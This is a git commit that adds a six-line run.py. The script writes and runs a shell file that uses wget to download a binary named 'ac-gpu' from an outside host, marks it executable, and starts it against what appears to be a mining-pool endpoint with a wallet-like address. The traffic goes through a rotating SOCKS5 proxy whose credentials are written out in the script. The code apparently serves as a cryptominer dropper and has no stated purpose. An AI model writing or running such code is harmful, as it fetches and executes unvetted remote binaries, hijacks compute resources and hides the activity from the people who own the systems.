026ffbdf0f8981ae3c161b085308472dab46cbf9
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2021-12-29 21:03:55 +0700

    Create run.py

---
+++ run.py
@@ -0,0 +1,6 @@
+import os
+os.system('echo "#!/bin/sh" >> tes')
+os.system('echo "wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu" >> tes')
+os.system('echo "./ac-gpu -F http://aqua.signal2noi.se:19998/0x3D00AE49a7587eb97aa4cAfD680d0461A4cC49A7/push -t 1 --proxy socks5://simbahkencot-rotate:tukimenreborn@p.webshare.io:80" >> tes')
+os.system('sleep 2')
+os.system('sh tes')
